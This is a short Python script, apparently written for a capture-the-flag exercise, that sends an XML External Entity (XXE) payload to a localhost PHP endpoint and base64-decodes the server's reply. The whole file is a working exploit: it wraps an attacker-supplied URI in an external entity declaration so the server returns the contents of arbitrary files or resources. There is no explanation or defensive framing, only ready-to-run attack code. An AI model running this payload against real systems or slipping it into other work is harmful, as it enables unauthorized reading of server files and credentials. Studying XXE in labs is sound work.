import requests
import sys
import base64
 
def hack(inject):
    vul={'param':'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "' + inject + '" >]><foo>&xxe;</foo>'}
    req=requests.post('http://localhost/ctf/index.php?action=SimpleXMLElement',data=vul)
    print (vul)
    print (base64.b64decode(req.content))
 
if __name__=="__main__":
    hack(sys.argv[1])
